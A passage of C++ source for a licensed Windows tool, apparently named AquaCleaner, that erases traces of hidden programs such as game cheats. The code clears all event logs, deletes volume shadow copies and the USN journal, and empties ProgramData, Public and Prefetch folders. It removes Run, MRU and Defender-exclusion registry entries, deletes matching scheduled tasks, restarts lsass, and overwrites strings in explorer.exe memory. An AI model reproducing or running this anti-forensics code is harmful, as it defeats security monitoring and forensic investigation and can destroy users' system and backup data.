                DWORD bytesRead;
                std::wstring output;

                while (ReadFile(hRead, buffer, sizeof(buffer) - sizeof(WCHAR), &bytesRead, NULL) && bytesRead > 0) {
                    buffer[bytesRead / sizeof(WCHAR)] = 0;
                    output += buffer;
                }

                CloseHandle(hRead);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);

                std::wstringstream ss(output);
                std::wstring logName;
                while (std::getline(ss, logName)) {
                    if (!logName.empty()) {
                        std::wstring clearCmd = L"wevtutil cl \"" + logName + L"\"";
                        _wsystem(clearCmd.c_str());
                    }
                }
            }
        }

        void DeleteDirectoryContents(LPCWSTR path) {
            WCHAR expandedPath[MAX_PATH];
            ExpandEnvironmentStringsW(path, expandedPath, MAX_PATH);

            if (!PathFileExistsW(expandedPath)) return;

            SHFILEOPSTRUCTW fileOp = { 0 };
            WCHAR from[MAX_PATH];
            wcscpy_s(from, expandedPath);
            wcscat_s(from, L"\\*");
            from[wcslen(from) + 1] = 0;

            fileOp.wFunc = FO_DELETE;
            fileOp.pFrom = from;
            fileOp.fFlags = FOF_NO_UI | FOF_SILENT;

            SHFileOperationW(&fileOp);

            // Specifically delete shared_store_ct.dat and launcher.exe if present
            WCHAR specificFiles[2][MAX_PATH];
            wsprintfW(specificFiles[0], L"%s\\shared_store_ct.dat", expandedPath);
            wsprintfW(specificFiles[1], L"%s\\launcher.exe", expandedPath);
            for (int i = 0; i < 2; ++i) {
                if (PathFileExistsW(specificFiles[i])) {
                    SetFileAttributesW(specificFiles[i], FILE_ATTRIBUTE_NORMAL);
                    DeleteFileW(specificFiles[i]);
                }
            }
        }

        void DeleteFolder(LPCWSTR folderPath) {
            if (!PathFileExistsW(folderPath)) return;

            SHFILEOPSTRUCTW fileOp = { 0 };
            WCHAR path[MAX_PATH];
            wcscpy_s(path, folderPath);
            path[wcslen(path) + 1] = 0;

            fileOp.wFunc = FO_DELETE;
            fileOp.pFrom = path;
            fileOp.fFlags = FOF_NO_UI | FOF_SILENT;

            SHFileOperationW(&fileOp);
        }

        // Function to search for specific files system-wide
        void SearchAndDeleteFile(const std::wstring & filename, const std::wstring & rootPath) {
            WIN32_FIND_DATAW findData;
            WCHAR searchPath[MAX_PATH];
            wsprintfW(searchPath, L"%s\\*", rootPath.c_str());
            HANDLE hFind = FindFirstFileW(searchPath, &findData);

            if (hFind == INVALID_HANDLE_VALUE) return;

            do {
                if (wcscmp(findData.cFileName, L".") == 0 || wcscmp(findData.cFileName, L"..") == 0) continue;

                WCHAR fullPath[MAX_PATH];
                wsprintfW(fullPath, L"%s\\%s", rootPath.c_str(), findData.cFileName);

                if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    // Recursively search subdirectories
                    SearchAndDeleteFile(filename, fullPath);
                }
                else if (_wcsicmp(findData.cFileName, filename.c_str()) == 0) {
                    // Delete the file if it matches
                    SetFileAttributesW(fullPath, FILE_ATTRIBUTE_NORMAL);
                    DeleteFileW(fullPath);
                }
            } while (FindNextFileW(hFind, &findData));

            FindClose(hFind);
        }

        // Function to clear Recycle Bin
        void ClearRecycleBin() {
            SHEmptyRecycleBinW(NULL, NULL, SHERB_NOCONFIRMATION | SHERB_NOPROGRESSUI | SHERB_NOSOUND);
        }

        // Function to reset Windows Search Index
        void ResetSearchIndex() {
            system("net stop wsearch");
            DeleteFolder(L"C:\\ProgramData\\Microsoft\\Search\\Data\\Applications\\Windows");
            system("net start wsearch");
        }

        // Function to clean Task Scheduler
        void CleanTaskScheduler() {
            HRESULT hr = CoInitializeEx(NULL, COINIT_MULTITHREADED);
            if (FAILED(hr)) {
                LogError(L"CoInitializeEx failed: " + std::to_wstring(hr));
                return;
            }

            ITaskService* pService = NULL;
            hr = CoCreateInstance(CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, IID_ITaskService, (void**)&pService);
            if (FAILED(hr)) {
                LogError(L"CoCreateInstance failed: " + std::to_wstring(hr));
                CoUninitialize();
                return;
            }

            hr = pService->Connect(_variant_t(), _variant_t(), _variant_t(), _variant_t());
            if (FAILED(hr)) {
                LogError(L"ITaskService::Connect failed: " + std::to_wstring(hr));
                pService->Release();
                CoUninitialize();
                return;
            }

            ITaskFolder* pRootFolder = NULL;
            hr = pService->GetFolder(_bstr_t(L"\\"), &pRootFolder);
            if (FAILED(hr)) {
                LogError(L"GetFolder failed: " + std::to_wstring(hr));
                pService->Release();
                CoUninitialize();
                return;
            }

            IRegisteredTaskCollection* pTaskCollection = NULL;
            hr = pRootFolder->GetTasks(0, &pTaskCollection);
            if (FAILED(hr)) {
                LogError(L"GetTasks failed: " + std::to_wstring(hr));
                pRootFolder->Release();
                pService->Release();
                CoUninitialize();
                return;
            }

            LONG numTasks = 0;
            pTaskCollection->get_Count(&numTasks);
            for (LONG i = 1; i <= numTasks; i++) {
                IRegisteredTask* pTask = NULL;
                hr = pTaskCollection->get_Item(_variant_t(i), &pTask);
                if (SUCCEEDED(hr)) {
                    BSTR taskName = NULL;
                    pTask->get_Name(&taskName);
                    ITaskDefinition* pTaskDef = NULL;
                    pTask->get_Definition(&pTaskDef);
                    IActionCollection* pActionCollection = NULL;
                    pTaskDef->get_Actions(&pActionCollection);
                    IAction* pAction = NULL;
                    pActionCollection->get_Item(1, &pAction);
                    IExecAction* pExecAction = NULL;
                    hr = pAction->QueryInterface(IID_IExecAction, (void**)&pExecAction);
                    if (SUCCEEDED(hr)) {
                        BSTR path = NULL;
                        pExecAction->get_Path(&path);
                        if (path && (wcsstr(path, L"shared_store_ct.dat") || wcsstr(path, L"launcher.exe"))) {
                            pRootFolder->DeleteTask(_bstr_t(taskName), 0);
                        }
                        SysFreeString(path);
                        pExecAction->Release();
                    }
                    pAction->Release();
                    pActionCollection->Release();
                    pTaskDef->Release();
                    SysFreeString(taskName);
                    pTask->Release();
                }
            }

            pTaskCollection->Release();
            pRootFolder->Release();
            pService->Release();
            CoUninitialize();
        }

        // Function to delete Volume Shadow Copies
        void DeleteShadowCopies() {
            system("vssadmin delete shadows /all /quiet");
        }

        void CleanRegistry() {
            // List of executables and files to remove from registry
            const std::vector<std::wstring> targetFiles = {
                L"main.exe",
                L"AquaCleaner.exe",
                L"RiotClient.exe",
                L"FortniteClient-Win32-Shipping.exe",
                L"shared_store_ct.dat",
                L"launcher.exe"
            };

            // Registry keys to check for specific file entries
            const struct {
                HKEY root;
                const wchar_t* subkey;
                bool isValueBased; // true for value-based keys (e.g., MuiCache), false for subkey-based (e.g., RecentDocs)
            } regKeys[] = {
                { HKEY_CURRENT_USER, L"Software\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\MuiCache", true },
                { HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\ShellNoRoam\\MUICache", true },
                { HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs", false },
                { HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\FeatureUsage\\AppSwitched", true },
                { HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Persisted", true },
                { HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows NT\\CurrentVersion\\AppCompatFlags\\Compatibility Assistant\\Store", true },
                { HKEY_CURRENT_USER, L"SOFTWARE\\Classes\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagMRU", false },
                { HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSavePidlMRU", false },
                { HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application", true },
                { HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\EventLog\\System", true },
                { HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", true },
                { HKEY_LOCAL_MACHINE, L"Software\\Microsoft\\Windows\\CurrentVersion\\Run", true },
                { HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", true },
                { HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths", true },
                { HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths", true }
            };

            for (const auto& key : regKeys) {
                HKEY hKey;
                if (RegOpenKeyExW(key.root, key.subkey, 0, KEY_ALL_ACCESS, &hKey) == ERROR_SUCCESS) {
                    if (key.isValueBased) {
                        // For value-based keys, enumerate and delete values containing target files
                        WCHAR valueName[256];
                        DWORD valueNameLen = 256;
                        DWORD valueIndex = 0;
                        std::vector<std::wstring> valuesToDelete;

                        while (RegEnumValueW(hKey, valueIndex, valueName, &valueNameLen, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                            for (const auto& file : targetFiles) {
                                if (_wcsicmp(std::wstring(valueName).c_str(), file.c_str()) == 0 || std::wstring(valueName).find(file) != std::wstring::npos) {
                                    valuesToDelete.push_back(valueName);
                                }
                            }
                            valueIndex++;
                            valueNameLen = 256; // Reset length for next iteration
                        }

                        for (const auto& value : valuesToDelete) {
                            RegDeleteValueW(hKey, value.c_str());
                        }
                    }
                    else {
                        // For subkey-based keys, delete the entire subkey
                        RegDeleteTreeW(key.root, key.subkey);
                    }
                    RegCloseKey(hKey);
                }
            }
        }

        // Function to perform batch script operations
        void PerformBatchOperations() {
            if (!isValidated) {
                LogError(L"PerformBatchOperations failed: Key not validated");
                MessageBoxW(NULL, L"Please validate your key first!", L"Error", MB_OK | MB_ICONERROR);
                return;
            }

            WCHAR userProfile[MAX_PATH];
            GetEnvironmentVariableW(L"USERPROFILE", userProfile, MAX_PATH);

            // Delete contents of Recent, Temp, and Prefetch directories
            WCHAR recentPath[MAX_PATH];
            wsprintfW(recentPath, L"%s\\AppData\\Roaming\\Microsoft\\Windows\\Recent", userProfile);
            DeleteDirectoryContents(recentPath);

            WCHAR tempPath[MAX_PATH];
            wsprintfW(tempPath, L"%s\\AppData\\Local\\Temp", userProfile);
            DeleteDirectoryContents(tempPath);

            DeleteDirectoryContents(L"C:\\Windows\\Prefetch");

            // Delete specific log files in C:\Windows\Logs\CBS
            DeleteFileW(L"C:\\Windows\\Logs\\CBS\\CBS.log");
            DeleteFileW(L"C:\\Windows\\Logs\\CBS\\FilterList.log");

            // Create empty log files
            std::wofstream cbsLog(L"C:\\Windows\\Logs\\CBS\\CBS.log");
            if (cbsLog.is_open()) cbsLog.close();

            std::wofstream filterLog(L"C:\\Windows\\Logs\\CBS\\FilterList.log");
            if (filterLog.is_open()) filterLog.close();

            // Create WordAutoSave directory in Documents
            WCHAR documentsPath[MAX_PATH];
            wsprintfW(documentsPath, L"%s\\Documents\\WordAutoSave", userProfile);
            CreateDirectoryW(documentsPath, NULL);

            // Copy Discord.lnk to current working directory
            WCHAR discordPath[MAX_PATH];
            wsprintfW(discordPath, L"%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Discord Inc\\Discord.lnk", userProfile);
            WCHAR currentDir[MAX_PATH];
            GetCurrentDirectoryW(MAX_PATH, currentDir);
            WCHAR discordDest[MAX_PATH];
            wsprintfW(discordDest, L"%s\\Discord.lnk", currentDir);
            CopyFileW(discordPath, discordDest, FALSE);
        }

        bool ShouldResetJournal() {
            std::vector<std::wstring> keywords = {
                L"launcher.exe", L"settings.cock", L"public.zip",
                L"main.exe", L"INSTRUCTIONS.txt", L"spoofer.zip",
                L"steam.exe", L"shared_store_ct.dat"
            };

            HANDLE hRead, hWrite;
            SECURITY_ATTRIBUTES sa = { sizeof(SECURITY_ATTRIBUTES), NULL, TRUE };
            CreatePipe(&hRead, &hWrite, &sa, 0);

            STARTUPINFOW si = { sizeof(si) };
            PROCESS_INFORMATION pi;
            si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
            si.hStdOutput = hWrite;
            si.hStdError = hWrite;
            si.wShowWindow = SW_HIDE;

            WCHAR cmd[] = L"cmd.exe /c fsutil usn readjournal C: /n";

            if (CreateProcessW(NULL, cmd, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi)) {
                CloseHandle(hWrite);

                char buffer[8192];
                DWORD bytesRead;
                std::string output;

                while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
                    buffer[bytesRead] = 0;
                    output += buffer;
                }

                CloseHandle(hRead);
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);

                for (const auto& word : keywords) {
                    if (output.find(std::string(word.begin(), word.end())) != std::string::npos) {
                        return true;
                    }
                }
            }
            return false;
        }

        void ResetUSNJournalIfNeeded() {
            if (ShouldResetJournal()) {
                system("fsutil usn deletejournal /d C:");
                Sleep(5000);
                system("fsutil usn createjournal m=1000 a=100 C:");
            }
        }

        // New function to scan and delete "launcher.exe" strings in memory
        void ScanAndDeleteLauncherString(HWND hwnd) {
            if (!isValidated) {
                LogError(L"ScanAndDeleteLauncherString failed: Key not validated");
                MessageBoxW(hwnd, L"Please validate your key first!", L"Error", MB_OK | MB_ICONERROR);
                return;
            }

            HANDLE hProcess = GetProcessHandle(L"explorer.exe");
            if (!hProcess) {
                LogError(L"Failed to open explorer.exe process for scanning");
                MessageBoxW(hwnd, L"Failed to open explorer.exe process!", L"Error", MB_OK | MB_ICONERROR);
                return;
            }

            SYSTEM_INFO sysInfo;
            GetSystemInfo(&sysInfo);
            MEMORY_BASIC_INFORMATION mbi;
            uintptr_t address = (uintptr_t)sysInfo.lpMinimumApplicationAddress;
            const std::string target = "launcher.exe";
            size_t targetLength = target.length();
            bool found = false;

            while (address < (uintptr_t)sysInfo.lpMaximumApplicationAddress) {
                if (VirtualQueryEx(hProcess, (LPCVOID)address, &mbi, sizeof(mbi)) == sizeof(mbi)) {
                    if (mbi.State == MEM_COMMIT && (mbi.Type == MEM_PRIVATE || mbi.Type == MEM_MAPPED) &&
                        (mbi.Protect == PAGE_READWRITE || mbi.Protect == PAGE_READONLY)) {
                        std::vector<char> buffer(mbi.RegionSize);
                        SIZE_T bytesRead;
                        if (ReadProcessMemory(hProcess, (LPCVOID)address, buffer.data(), mbi.RegionSize, &bytesRead)) {
                            for (size_t i = 0; i <= bytesRead - targetLength; ++i) {
                                if (strncmp(&buffer[i], target.c_str(), targetLength) == 0) {
                                    std::string replacement(targetLength, '.');
                                    SIZE_T bytesWritten;
                                    if (WriteProcessMemory(hProcess, (LPVOID)(address + i), replacement.c_str(), targetLength, &bytesWritten)) {
                                        LogError(L"Replaced 'launcher.exe' at address: " + std::to_wstring(address + i));
                                        found = true;
                                    }
                                    else {
                                        LogError(L"Failed to write at address: " + std::to_wstring(address + i) + L" Error: " + std::to_wstring(GetLastError()));
                                    }
                                }
                            }
                        }
                    }
                    address += mbi.RegionSize;
                }
                else {
                    address += sysInfo.dwPageSize;
                }
            }

            CloseHandle(hProcess);
            if (found) {
                MessageBoxW(hwnd, L"Successfully scanned and replaced 'launcher.exe' strings in memory!", L"Success", MB_OK | MB_ICONINFORMATION);
            }
            else {
                MessageBoxW(hwnd, L"No 'launcher.exe' strings found in explorer.exe memory.", L"Info", MB_OK | MB_ICONINFORMATION);
            }
        }

        void PerformFullCleanup(HWND hwnd) {
            if (!isValidated) {
                LogError(L"PerformFullCleanup failed: Key not validated");
                MessageBoxW(hwnd, L"Please validate your key first!", L"Error", MB_OK | MB_ICONERROR);
                return;
            }

            // Perform memory scan for launcher.exe strings
            ScanAndDeleteLauncherString(hwnd);

            // Hide recently executed files
            HideRecentFiles();

            // Perform registry cleanup for specific files
            CleanRegistry();

            WCHAR userProfile[MAX_PATH];
            GetEnvironmentVariableW(L"USERPROFILE", userProfile, MAX_PATH);

            WCHAR tempPath[MAX_PATH];
            GetTempPathW(MAX_PATH, tempPath);

            // Delete contents of specific directories
            DeleteDirectoryContents(tempPath);
            DeleteDirectoryContents(L"C:\\Windows\\Temp");
            DeleteDirectoryContents(L"C:\\Windows\\Prefetch");
            DeleteDirectoryContents(L"C:\\ProgramData");
            DeleteDirectoryContents(L"C:\\Users\\Public");
            DeleteDirectoryContents(L"%USERPROFILE%\\AppData\\Local\\Microsoft\\Windows\\INetCache");

            // Check and delete specific files, including shared_store_ct.dat and launcher.exe
            std::vector<std::wstring> pathsToCheck = {
                L"C:\\Users\\AquaOS\\AppData\\Local\\Temp\\main.exe",
                L"C:\\Windows\\Temp\\main.exe",
                L"C:\\Windows\\Prefetch\\MAIN.EXE-*",
                std::wstring(userProfile) + L"\\AppData\\Local\\main.exe",
                std::wstring(userProfile) + L"\\Downloads\\main.exe",
                std::wstring(userProfile) + L"\\Recent\\main.exe",
                L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\main.exe",
                L"C:\\Windows\\SystemApps\\Shared\\shared_store_ct.dat",
                L"C:\\Windows\\Temp\\shared_store_ct.dat",
                std::wstring(userProfile) + L"\\AppData\\Local\\Temp\\shared_store_ct.dat",
                std::wstring(userProfile) + L"\\Downloads\\shared_store_ct.dat",
                L"C:\\Windows\\Prefetch\\SHARED_STORE_CT.DAT-*",
                L"C:\\ProgramData\\shared_store_ct.dat",
                L"C:\\Users\\Public\\shared_store_ct.dat",
                std::wstring(userProfile) + L"\\AppData\\Local\\Microsoft\\Windows\\INetCache\\shared_store_ct.dat",
                L"C:\\Windows\\SystemApps\\Shared\\launcher.exe",
                L"C:\\Windows\\Temp\\launcher.exe",
                L"C:\\Windows\\Prefetch\\LAUNCHER.EXE-*",
                std::wstring(userProfile) + L"\\AppData\\Local\\launcher.exe",
                std::wstring(userProfile) + L"\\Downloads\\launcher.exe",
                std::wstring(userProfile) + L"\\Recent\\launcher.exe",
                L"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\launcher.exe",
                L"C:\\ProgramData\\launcher.exe",
                L"C:\\Users\\Public\\launcher.exe",
                std::wstring(userProfile) + L"\\AppData\\Local\\Microsoft\\Windows\\INetCache\\launcher.exe"
            };

            for (const auto& path : pathsToCheck) {
                WIN32_FIND_DATAW findData;
                HANDLE hFind = FindFirstFileW(path.c_str(), &findData);
                if (hFind != INVALID_HANDLE_VALUE) {
                    do {
                        WCHAR fullPath[MAX_PATH];
                        wsprintfW(fullPath, L"%s\\%s", path.substr(0, path.find_last_of(L"\\")).c_str(), findData.cFileName);
                        SetFileAttributesW(fullPath, FILE_ATTRIBUTE_NORMAL);
                        DeleteFileW(fullPath);
                    } while (FindNextFileW(hFind, &findData));
                    FindClose(hFind);
                }
            }

            // System-wide search for shared_store_ct.dat, launcher.exe, and AquaCleaner.log
            SearchAndDeleteFile(L"shared_store_ct.dat", L"C:\\");
            SearchAndDeleteFile(L"shared_store_ct.dat", std::wstring(userProfile));
            SearchAndDeleteFile(L"launcher.exe", L"C:\\");
            SearchAndDeleteFile(L"launcher.exe", std::wstring(userProfile));
            SearchAndDeleteFile(L"AquaCleaner.log", L"C:\\");
            SearchAndDeleteFile(L"AquaCleaner.log", std::wstring(userProfile));

            // Delete specific folders
            DeleteFolder(L"C:\\Users\\AquaOS\\AppData\\Local\\CrashReportClient");
            DeleteFolder(L"C:\\Users\\AquaOS\\AppData\\Local\\CrashDumps");
            DeleteFolder(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportQueue");
            DeleteFolder(L"C:\\ProgramData\\Microsoft\\Windows\\WER\\ReportArchive");
            DeleteFolder(L"C:\\ProgramData\\Microsoft\\Windows Defender\\Support");

            // Additional cleanup operations
            ClearRecycleBin();
            ResetSearchIndex();
            CleanTaskScheduler();
            DeleteShadowCopies();

            // Perform batch script operations
            PerformBatchOperations();

            // Clear event viewer logs and reset USN journal
            ClearEventViewerLogs();
            ResetUSNJournalIfNeeded();

            // Restart lsass.exe to clear memory traces
            if (!RestartLsass()) {
                MessageBoxW(hwnd, L"Failed to restart lsass.exe. Some traces may remain.", L"Warning", MB_OK | MB_ICONWARNING);
            }
            else {
                LogError(L"lsass.exe restarted successfully.");
            }

            MessageBoxW(hwnd, L"Cleanup completed!", L"Done", MB_OK | MB_ICONINFORMATION);
        }

        // Memory manipulation functions
        HANDLE GetProcessHandle(const std::wstring & processName) {
            HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
            if (hSnap == INVALID_HANDLE_VALUE) {
                LogError(L"CreateToolhelp32Snapshot failed: " + std::to_wstring(GetLastError()));
                return NULL;
            }

            PROCESSENTRY32W pe32;
            pe32.dwSize = sizeof(pe32);
            HANDLE hProcess = NULL;

            if (Process32FirstW(hSnap, &pe32)) {
                do {
                    if (_wcsicmp(pe32.szExeFile, processName.c_str()) == 0) {
                        hProcess = OpenProcess(PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_VM_OPERATION | PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);
                        if (!hProcess) {
                            LogError(L"OpenProcess failed for " + processName + L": " + std::to_wstring(GetLastError()));
                        }
                        break;
                    }
                } while (Process32NextW(hSnap, &pe32));
            }

            CloseHandle(hSnap);
            return hProcess;
        }

        bool ReadProcessMemoryString(HANDLE hProcess, LPVOID address, SIZE_T length, std::string & outString) {
            std::vector<char> buffer(length);
            SIZE_T bytesRead;
            if (!ReadProcessMemory(hProcess, address, buffer.data(), length, &bytesRead) || bytesRead != length) {
                LogError(L"ReadProcessMemory failed at " + std::to_wstring((uintptr_t)address) + L": " + std::to_wstring(GetLastError()));
                return false;
            }

            try {
                outString.assign(buffer.begin(), buffer.end());
                // Trim null characters for display
                outString = outString.c_str();
            }
            catch (...) {
                LogError(L"Invalid memory at " + std::to_wstring((uintptr_t)address) + L": non-UTF-8 data");
                return false;
            }
            return true;
        }

        bool WriteProcessMemoryString(HANDLE hProcess, LPVOID address, SIZE_T length) {
            std::string value(length, '.');
            SIZE_T bytesWritten;
            if (!WriteProcessMemory(hProcess, address, value.c_str(), length, &bytesWritten) || bytesWritten != length) {
                LogError(L"WriteProcessMemory failed at " + std::to_wstring((uintptr_t)address) + L": " + std::to_wstring(GetLastError()));
                return false;
            }
            return true;
        }

        void ProcessMemoryOperations(HWND hwnd, const std::vector<uintptr_t>&addresses, const std::vector<int>&lengths) {
            if (!isValidated) {
                LogError(L"ProcessMemoryOperations failed: Key not validated");
                MessageBoxW(hwnd, L"Please validate your key first!", L"Error", MB_OK | MB_ICONERROR);
                return;
            }

            HANDLE hProcess = GetProcessHandle(L"explorer.exe");
            if (!hProcess) {
                MessageBoxW(hwnd, L"Failed to open explorer.exe process!", L"Error", MB_OK | MB_ICONERROR);
                return;
            }

            for (size_t i = 0; i < addresses.size(); ++i) {
                uintptr_t address = addresses[i];
                int length = lengths[i];

                std::string readString;
                if (ReadProcessMemoryString(hProcess, (LPVOID)address, length, readString)) {
                    std::wstring message = L"Read String at " + std::to_wstring(address) + L": " + std::wstring(readString.begin(), readString.end());
                    LogError(message);
                }
                else {
                    std::wstring message = L"Skipping invalid memory at " + std::to_wstring(address) + L": non-UTF-8 data";
                    LogError(message);
                    continue;
                }

                if (!WriteProcessMemoryString(hProcess, (LPVOID)address, length)) {
                    std::wstring message = L"Failed to write to address " + std::to_wstring(address);
                    MessageBoxW(hwnd, message.c_str(), L"Error", MB_OK | MB_ICONERROR);
                    continue;
                }

                std::wstring message = L"Successfully wrote to address " + std::to_wstring(address);
                LogError(message);
            }

            CloseHandle(hProcess);
            MessageBoxW(hwnd, L"Memory operations completed!", L"Success", MB_OK | MB_ICONINFORMATION);
        }

        void RemoveString(HWND hwnd, HWND hwndMemoryAddress, HWND hwndLength, HWND hwndFilePath) {
            if (!isValidated) {
                LogError(L"RemoveString failed: Key not validated");
                MessageBoxW(hwnd, L"Please validate your key first!", L"Error", MB_OK | MB_ICONERROR);
                return;
            }

            WCHAR addressBuffer[256];
            GetWindowTextW(hwndMemoryAddress, addressBuffer, 256);
            std::wstring addressStr = addressBuffer;
            if (addressStr.empty()) {
                MessageBoxW(hwnd, L"Memory address is empty!", L"Error", MB_OK | MB_ICONERROR);
                return;
            }

            uintptr_t address;
            try {
                address = std::stoull(addressStr, nullptr, 16);
            }
            catch (...) {
                MessageBoxW(hwnd, L"Invalid memory address! It should be a valid hexadecimal number.", L"Error", MB_OK | MB_ICONERROR);
                return;
            }

            WCHAR lengthBuffer[256];
            GetWindowTextW(hwndLength, lengthBuffer, 256);
            std::wstring lengthStr = lengthBuffer;
            int length;
            try {
                length = std::stoi(lengthStr);
            }
            catch (...) {
                MessageBoxW(hwnd, L"Invalid length value!", L"Error", MB_OK | MB_ICONERROR);
                return;
            }

            WCHAR filePathBuffer[512];
            GetWindowTextW(hwndFilePath, filePathBuffer, 512);
            std::wstring filePath = filePathBuffer;

            HANDLE hProcess = GetProcessHandle(L"explorer.exe");
            if (!hProcess) {
                MessageBoxW(hwnd, L"Failed to open explorer.exe process!", L"Error", MB_OK | MB_ICONERROR);
                return;
            }

            std::string readString;
            if (ReadProcessMemoryString(hProcess, (LPVOID)address, length, readString)) {
                std::wstring message = L"Read String at " + std::to_wstring(address) + L": " + std::wstring(readString.begin(), readString.end());
                LogError(message);
            }
            else {
                CloseHandle(hProcess);
                MessageBoxW(hwnd, L"Skipping invalid memory at address: non-UTF-8 data", L"Error", MB_OK | MB_ICONERROR);
                return;
            }

            if (!WriteProcessMemoryString(hProcess, (LPVOID)address, length)) {
                CloseHandle(hProcess);
                MessageBoxW(hwnd, L"Failed to write to address!", L"Error", MB_OK | MB_ICONERROR);
                return;
            }

            if (!filePath.empty()) {
                if (PathFileExistsW(filePath.c_str())) {
                    std::wstring extension = filePath.substr(filePath.find_last_of(L".") + 1);
                    std::wstring message;
                    if (_wcsicmp(extension.c_str(), L"exe") == 0) {
                        message = L"Detected .exe file: " + filePath;
                    }
                    else if (_wcsicmp(extension.c_str(), L"rar") == 0) {
                        message = L"Detected .rar file: " + filePath;
                    }
                    else if (_wcsicmp(extension.c_str(), L"zip") == 0) {
                        message = L"Detected .zip file: " + filePath;
                    }
                    else {
                        message = L"File type not recognized: " + filePath;
                    }
                    LogError(message);
                }
                else {
                    LogError(L"File not found: " + filePath);
                }
            }
            else {
                LogError(L"No file path provided.");
            }

            CloseHandle(hProcess);
            MessageBoxW(hwnd, L"Successfully wrote to address!", L"Success", MB_OK | MB_ICONINFORMATION);
        }

        void LoadFile(HWND hwnd, HWND hwndMemoryAddress, HWND hwndLength, HWND hwndFilePath) {
            if (!isValidated) {
                LogError(L"LoadFile failed: Key not validated");
                MessageBoxW(hwnd, L"Please validate your key first!", L"Error", MB_OK | MB_ICONERROR);
                return;
            }

            OPENFILENAMEW ofn = { sizeof(OPENFILENAMEW) };
            WCHAR szFile[512] = L"";
            ofn.hwndOwner = hwnd;
            ofn.lpstrFile = szFile;
            ofn.nMaxFile = sizeof(szFile) / sizeof(WCHAR);
            ofn.lpstrFilter = L"Text Files (*.txt)\0*.txt\0All Files (*.*)\0*.*\0";
            ofn.nFilterIndex = 1;
            ofn.Flags = OFN_PATHMUSTEXIST | OFN_FILEMUSTEXIST;

            if (!GetOpenFileNameW(&ofn)) {
                DWORD error = CommDlgExtendedError();
                if (error) {
                    LogError(L"GetOpenFileNameW failed: " + std::to_wstring(error));
                }
                return;
            }

            std::wifstream file(szFile);
            if (!file.is_open()) {
                LogError(L"Failed to open file: " + std::wstring(szFile));
                MessageBoxW(hwnd, L"Failed to open the selected file!", L"Error", MB_OK | MB_ICONERROR);
                return;
            }

            std::vector<uintptr_t> addresses;
            std::vector<int> lengths;
            std::vector<std::wstring> filePaths;
            std::wstring line;

            while (std::getline(file, line)) {
                // Expected format: address(length)filepath
                size_t openParen = line.find(L'(');
                size_t closeParen = line.find(L')');
                if (openParen == std::wstring::npos || closeParen == std::wstring::npos || closeParen < openParen) {
                    LogError(L"Invalid line format: " + line);
                    continue;
                }

                std::wstring addressStr = line.substr(0, openParen);
                std::wstring lengthStr = line.substr(openParen + 1, closeParen - openParen - 1);
                std::wstring filePathStr = closeParen + 1 < line.length() ? line.substr(closeParen + 1) : L"";

                try {
                    uintptr_t address = std::stoull(addressStr, nullptr, 16);
                    int length = std::stoi(lengthStr);

                    addresses.push_back(address);
                    lengths.push_back(length);
                    filePaths.push_back(filePathStr);
                }
                catch (...) {
                    LogError(L"Invalid data in line: " + line);
                    continue;
                }
            }

            file.close();

            if (addresses.empty()) {
                MessageBoxW(hwnd, L"No valid data found in the file!", L"Error", MB_OK | MB_ICONERROR);
                return;
            }

            // Update GUI with the last valid entry
            SetWindowTextW(hwndMemoryAddress, (L"0x" + std::to_wstring(addresses.back())).c_str());
            SetWindowTextW(hwndLength, std::to_wstring(lengths.back()).c_str());
            SetWindowTextW(hwndFilePath, filePaths.back().c_str());

            // Perform memory operations
            ProcessMemoryOperations(hwnd, addresses, lengths);
        }

        // Windows GUI Boilerplate
        LRESULT CALLBACK WindowProc(HWND hwnd, UINT uMsg, WPARAM wParam, LPARAM lParam) {
            static HWND hwndEditKey, hwndEditMemoryAddress, hwndEditLength, hwndEditFilePath;

            switch (uMsg) {
            case WM_CREATE: {
                // Original controls
                hwndEditKey = CreateWindowW(L"EDIT", L"",
                    WS_CHILD | WS_VISIBLE | WS_BORDER | ES_AUTOHSCROLL,
                    50, 100, 180, 20,
                    hwnd, (HMENU)ID_EDIT_KEY, NULL, NULL);

                CreateWindowW(L"BUTTON", L"Validate Key",
                    WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
                    50, 130, 80, 30,
                    hwnd, (HMENU)ID_BUTTON_VALIDATE, NULL, NULL);

                CreateWindowW(L"BUTTON", L"Generate Key",
                    WS_TABSTOP | WS_VISIBLE | WS_CHILD | BS_DEFPUSHBUTTON,
